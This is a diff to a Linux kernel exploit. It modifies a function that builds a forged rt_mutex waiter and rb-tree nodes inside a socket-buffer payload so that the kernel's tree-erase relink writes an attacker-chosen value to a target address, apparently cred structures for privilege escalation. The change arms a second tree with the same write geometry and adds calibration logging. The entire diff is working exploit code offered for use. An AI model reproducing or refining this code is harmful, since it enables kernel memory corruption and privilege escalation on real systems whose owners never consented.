@@ -404,15 +404,34 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
        * would leave the node parentless for enqueue_pi to trash
        * fake_task. prio > 120 gates this erase. The relink's second
        * write lands in *(value+8): cred image on W2, page rb_root at 0. */
-      put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
-      put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
-      put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
+      /* Upstream arms BOTH trees with the same write geometry (orig-c
+       * fops.c:450-458: relink_pc = value, relink_left = target, applied to
+       * tree_pc/right/left AND pi_pc/right/left).  Setting only pi_tree left
+       * tree_entry as 1/0/0, which the walk can trip over first and then find
+       * no write geometry at all (measured: tcp route won seq=19 with a correct
+       * pi_tree and no store). */
+      put64(p, W0_OFF + 0x00, write_right);  /* tree_entry.rb_parent_color = value */
+      put64(p, W0_OFF + 0x08, 0);            /* tree_entry.rb_right = 0 */
+      put64(p, W0_OFF + 0x10, write_right ? request->target : 0); /* rb_left = dest */
       (void) encode_compact_waiter(
           {reinterpret_cast<std::byte *>(p + W0_OFF),
            kCompactWaiterBytes},
           *request, write_layout);
       put64(p, W0_OFF + 0x30, waiter_task); /* task */
       put64(p, W0_OFF + 0x38, (g_exploit_session.heap.current.fake_lock));   /* lock */
+      {
+        /* calibration: what the erase relink will actually see as the forged
+         * pi_tree node -- pc carries the word, rb_left the destination. */
+        uint64_t v18 = 0, v20 = 0, v28 = 0;
+        memcpy(&v18, p + W0_OFF + 0x18, 8);
+        memcpy(&v20, p + W0_OFF + 0x20, 8);
+        memcpy(&v28, p + W0_OFF + 0x28, 8);
+        pr_info("payload w0: pc=%016zx right=%016zx left=%016zx prio=%u "
+                "target=%016zx preserve_child=%d\n",
+                (size_t) v18, (size_t) v20, (size_t) v28,
+                (unsigned) FAKE_WAITER_PRIO, (size_t) request->target,
+                (int) request->preserve_child);
+      }
       put32(p, W0_OFF + 0x40, 0);           /* wake_state */
       put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
       put64(p, W0_OFF + 0x48, 0);           /* deadline */
@@ -427,6 +446,12 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+      pr_info("payload rb6x: pc=%016zx right=%016zx left=%016zx "
+              "lay(p=%016zx r=%016zx l=%016zx) target=%016zx pres=%d\n",
+              (size_t) write_pc, (size_t) write_right, (size_t) write_left,
+              (size_t) write_layout.parent, (size_t) write_layout.right,
+              (size_t) write_layout.left, (size_t) request->target,
+              (int) request->preserve_child);
       put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
       put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
